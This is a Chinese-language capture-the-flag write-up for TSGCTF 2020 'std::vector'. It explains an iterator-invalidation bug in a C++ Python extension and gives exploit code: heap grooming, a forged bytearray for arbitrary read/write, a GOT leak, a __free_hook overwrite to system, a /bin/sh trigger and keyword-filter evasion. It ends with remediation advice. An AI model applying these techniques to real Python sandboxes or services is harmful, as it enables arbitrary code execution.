# TSGCTF2020 std::vector WP

## 题目简述

服务允许提交一段受关键字过滤的 Python 3.7 代码，模板预先导入自定义扩展模块 `stdvec`，并只保留 `int`、`id`、`print`、`range`、`hex`、`bytearray`、`bytes` 等少量内置对象。扩展用 C++ `std::vector<PyObject *>` 实现追加、读写和迭代。

漏洞是迭代器失效。创建迭代器时，扩展把 `begin()` 和 `end()` 两个裸迭代器直接保存在 Python 对象中：

```cpp
vector<PyObject *>::iterator st = self->v->begin();
vector<PyObject *>::iterator ed = self->v->end();
itr->current = st;
itr->end = ed;
```

若在 `for` 循环中继续 `append`，vector 容量不足时会重新分配内部数组并释放旧缓冲区，但迭代器仍访问旧地址。用新的堆对象占据旧缓冲区后，便能让 `iter_next` 把攻击者写入的地址当成 `PyObject *` 返回。

## 解题过程

先准备一个尺寸大于 512 字节的 `bytes` 对象 `gue`，记录 `id(gue)` 后释放它。大对象绕过 CPython 的小对象分配器，使用与 C++ vector 缓冲区相同的 libc heap。随后构造 `bytearray(guo)`，其独立数据区复用刚释放的地址，并在该地址写入伪造的 `PyByteArrayObject`：

```python
guo = (
    p64(0x41414141) +
    p64(id(bytearray)) +
    p64(0x7fffffffffffffff) +
    p64(0) * 4 +
    b"ABCDEFGH" * 105
)
fake_object = id(gue)
gue = 1
fake = bytearray(guo)
```

伪对象的 `ob_type` 指向真实 `bytearray` 类型，长度设为极大值，而 `ob_bytes/ob_start` 为 0。只要解释器把 `fake_object` 当作 bytearray，索引就以地址 0 为数据基址，获得任意地址读写。

然后向 `StdVec` 追加 256 个元素，使其容量恰好用满。在第 6 次迭代时再追加一个元素，vector 扩容并释放旧的 256 项指针数组；紧接着申请约 2 KiB 的 `bytearray`，让其数据区复用旧数组，并在后续槽位反复写入 `fake_object`：

```python
l = stdvec.StdVec()
for _ in range(256):
    l.append(0xdeadbeef)

n = 0
for i in l:
    n += 1
    if n == 6:
        l.append(2)  # 释放迭代器仍指向的旧 vector 缓冲区
    elif n == 7:
        b = bytearray(
            p64(0xdeadbeef) + p64(0x414114141) +
            p64(fake_object) * (256 - 8)
        )
    elif n > 7:
        # i 已被解释为伪造 bytearray
        break
```

下一次从悬空迭代器取值时，`iter_next` 从被覆盖的旧数组中读出 `fake_object`，对其执行 `Py_INCREF` 后作为 Python 对象返回。此时 `i[address:address+8]` 就是任意地址读写。官方脚本先从扩展模块映射中的 `free@GOT` 读取真实 `free`：

```python
free_addr = u64(i[0xa00520:0xa00528])
libc_base = free_addr - 0x979c0
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f4e0
i[free_hook:free_hook + 8] = p64(system)
```

最后创建内容以 `/bin/sh\0` 开头的临时大 `bytearray`。临时对象很快析构并释放其数据缓冲区，覆盖后的 `__free_hook` 将这次 `free(buffer)` 改为 `system(buffer)`，从而执行 `/bin/sh`。变量名故意避开过滤器中的 `sys`、`base` 等子串，例如脚本把 `system` 写成 `sstem`、把 `base` 写成 `bse`。仓库中的 flag 为：

```text
TSGCTF{u51n6_c++_15_4_k3y_70_wr173_4n_3ff1c13n7_py7h0n_pr06r4m}
```

## 方法总结

本题展示了把 C++ 容器直接暴露给 Python 时的生命周期漏洞：`std::vector` 扩容会使所有旧迭代器失效，而扩展没有让迭代器持有容器、版本号或稳定快照。利用先用堆风水复用旧 vector 缓冲区，伪造一个数据指针为 0 的 bytearray 获得任意读写，再泄漏 GOT、覆盖 `__free_hook`。安全封装应在迭代期间禁止结构修改，或让迭代器检查 generation；同时所有返回的 `PyObject *` 必须来自仍然有效并正确持有引用的存储。
